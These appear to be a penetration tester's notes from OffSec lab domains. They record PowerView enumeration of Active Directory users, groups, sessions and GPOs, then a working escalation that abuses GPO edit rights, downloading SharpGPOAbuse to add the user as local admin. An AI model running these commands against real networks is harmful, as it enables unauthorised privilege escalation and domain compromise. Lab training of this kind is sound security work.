#!/usr/bin/peno

#Installing and importing PowerView
Import-Module .\PowerView.ps1

#User enumeration using Get-NetLoggedon
Get-NetLoggedon -ComputerName client251

#Enumerating active user sessions with Get-NetSession
Get-NetSession -ComputerName dc01

#Getting Computers
PS C:\Users\Jess.OFFSEC\Desktop> Get-DomainComputer |select samaccountname, name

samaccountname name
-------------- ----
DC01$          DC01
CLIENT01$      CLIENT01
WEB01$         WEB01

#Getting Users
PS C:\Users\Jess.OFFSEC\Desktop> Get-DomainUser | select memberof, name

memberof                                                                                                                                                                                                  name
--------                                                                                                                                                                                                  ----
{CN=Group Policy Creator Owners,CN=Users,DC=offsec,DC=live, CN=Domain Admins,CN=Users,DC=offsec,DC=live, CN=Enterprise Admins,CN=Users,DC=offsec,DC=live, CN=Schema Admins,CN=Users,DC=offsec,DC=live...} Administrator
CN=Guests,CN=Builtin,DC=offsec,DC=live                                                                                                                                                                    Guest
CN=Denied RODC Password Replication Group,CN=Users,DC=offsec,DC=live                                                                                                                                      krbtgt
CN=WebAdmins,CN=Users,DC=offsec,DC=live                                                                                                                                                                   nina
CN=SQLAdmins,CN=Users,DC=offsec,DC=live                                                                                                                                                                   hannah
CN=ClientAdmins,CN=Users,DC=offsec,DC=live                                                                                                                                                                jess
                                                                                                                                                                                                          svc-auth
#Getting Groups
PS C:\Users\Jess.OFFSEC\Desktop> Get-Domaingroup  |select name,member

name                                    member
----                                    ------
Administrators                          {CN=Domain Admins,CN=Users,DC=offsec,DC=live, CN=Enterprise Admins,CN=Users,DC=offsec,DC=live, CN=Administrator,CN=Users,DC=offsec,DC=live}
Users                                   {CN=Domain Users,CN=Users,DC=offsec,DC=live, CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=offsec,DC=live, CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=offsec,DC=live}
Guests                                  {CN=Domain Guests,CN=Users,DC=offsec,D


-->

PS C:\Users\Jess.OFFSEC\Desktop> Get-DomainGroupMember  -Identity "Domain Admins"


GroupDomain             : offsec.live
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=offsec,DC=live
MemberDomain            : offsec.live
MemberName              : SQLAdmins
MemberDistinguishedName : CN=SQLAdmins,CN=Users,DC=offsec,DC=live
MemberObjectClass       : group
MemberSID               : S-1-5-21-3820301825-3054645470-818849835-1605

GroupDomain             : offsec.live
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=offsec,DC=live
MemberDomain            : offsec.live
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=offsec,DC=live
MemberObjectClass       : user
MemberSID               : S-1-5-21-3820301825-3054645470-818849835-500

-->

PS C:\Users\Jess.OFFSEC\Desktop> Get-DomainGroupMember  -Identity "Domain Admins" -Recurse


GroupDomain             : offsec.live
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=offsec,DC=live
MemberDomain            : offsec.live
MemberName              : SQLAdmins
MemberDistinguishedName : CN=SQLAdmins,CN=Users,DC=offsec,DC=live
MemberObjectClass       : group
MemberSID               : S-1-5-21-3820301825-3054645470-818849835-1605

GroupDomain             : offsec.live
GroupName               : SQLAdmins
GroupDistinguishedName  : CN=SQLAdmins,CN=Users,DC=offsec,DC=live
MemberDomain            : offsec.live
MemberName              : hannah
MemberDistinguishedName : CN=hannah,CN=Users,DC=offsec,DC=live
MemberObjectClass       : user
MemberSID               : S-1-5-21-3820301825-3054645470-818849835-1602

GroupDomain             : offsec.live
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=offsec,DC=live
MemberDomain            : offsec.live
MemberName              : Administrator
MemberDistinguishedName : CN=Administrator,CN=Users,DC=offsec,DC=live
MemberObjectClass       : user
MemberSID               : S-1-5-21-3820301825-3054645470-818849835-500



PS C:\Users\Jess.OFFSEC\Desktop>




#Group Policy Object Enumeration
#Get-NetGPO to list GPOs.


*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-NetGPO


usncreated               : 5672
systemflags              : -1946157056
displayname              : Default Domain Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A
...

-->
We can check what permissions we have on a specific GPO by passing its GUID (labeled "name") to the cmdlet Get-GPPermission. 
Let's check our permissions on the Default Group Policy.

*Evil-WinRM* PS C:\Users\anirudh\Documents> Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh


Trustee     : anirudh
TrusteeType : User
Permission  : GpoEditDeleteModifySecurity
Inherited   : False

-->

The entry labeled Permission shows that we have the ability to edit, delete, and modify this policy. We can take advantage of this misconfiguration by using a tool named SharpGPOAbuse.

-->
wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe

-->
*Evil-WinRM* PS C:\Users\anirudh\Documents> ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "Default Domain Policy"
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
*Evil-WinRM* PS C:\Users\anirudh\Documents> 


#Important command
#Get Domain Admins members
#Get a list of Computers
#Get-netloggon and get-netsession on each computer
#Search if there is an Active Domain Admin session
Invoke-UserHunter -CheckAccess
